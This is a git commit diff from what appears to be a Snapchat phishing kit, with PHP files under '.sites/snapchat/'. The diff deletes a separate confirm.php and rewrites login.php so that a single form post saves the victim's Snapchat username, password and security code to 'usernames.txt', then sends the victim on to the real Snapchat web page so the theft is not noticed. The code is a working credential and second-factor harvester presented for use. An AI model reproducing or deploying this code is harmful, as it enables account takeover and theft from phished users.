ca83198b63cd63729ba1073eb188ed6eb3d206c0
Maxhem2 <genemaxd@gmail.com>
2024-03-20 16:34:10 +0100

    sd

--- .sites/snapchat/confirm.php
+++
@@ -1,6 +0,0 @@
-<?php
-
-file_put_contents("usernames.txt", " Security Code: " . $_POST['security_code'] . "\n", FILE_APPEND);
-header('Location: https://web.snapchat.com/');
-exit();
-?>
--- .sites/snapchat/login.php
+++ .sites/snapchat/login.php
@@ -1,6 +1,6 @@
 <?php
 
-file_put_contents("usernames.txt", "Snapchat Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: login.html?showSecurityCode=true');
+file_put_contents("usernames.txt", "Snapchat Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . " Security Code: " . $_POST['security_code'] . "\n", FILE_APPEND);
+header('Location: https://web.snapchat.com');
 exit();
 ?>
